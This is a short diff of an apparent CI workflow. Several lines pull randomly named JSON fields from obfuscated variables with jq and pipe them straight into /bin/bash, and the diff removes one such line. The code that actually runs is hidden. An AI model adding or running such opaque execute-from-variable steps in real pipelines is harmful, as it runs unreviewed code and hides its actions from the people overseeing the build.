@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$puu643" | jq -r .iuyfu6 | /bin/bash
           echo $tznv00 | jq -r .goylo658 | /bin/bash
           echo $sfd39157 | jq -r .btt5917 | /bin/bash
-          echo $elpi214 | jq -r .c5218 | /bin/bash
           echo $d921 | jq -r .hqea13 | /bin/bash
 
       - name: Archive results
